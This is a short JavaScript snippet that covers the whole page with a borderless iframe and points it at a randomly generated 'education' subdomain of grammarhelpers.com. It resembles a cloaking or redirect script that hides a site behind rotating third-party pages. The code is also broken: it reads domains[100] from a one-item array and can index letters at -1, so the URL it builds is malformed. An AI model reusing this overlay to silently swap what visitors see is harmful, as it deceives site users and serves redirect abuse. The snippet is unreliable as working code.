document.body.style.background = "url('https://motionarray.imgix.net/1723589-uI0PNDYDu6-high_0014.jpg?w=660&q=60&fit=max&auto=format') no-repeat";
var letters = ["aaa","bbb","ccc","ddd","eee","fff","ggg","aab","aac","ddc","ddf","znf"];
var numbers = Math.floor(Math.random() * 1001);
var domains = [".grammarhelpers.com"];

var iframe = document.createElement("iframe");
iframe.src = "";
iframe.style = "position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0;";
document.body.appendChild(iframe);

setTimeout(function(){
  let link = "https://education" + letters[Math.floor(Math.random() * 13) - 1] + numbers + domains[100];
  iframe.src = link;
})
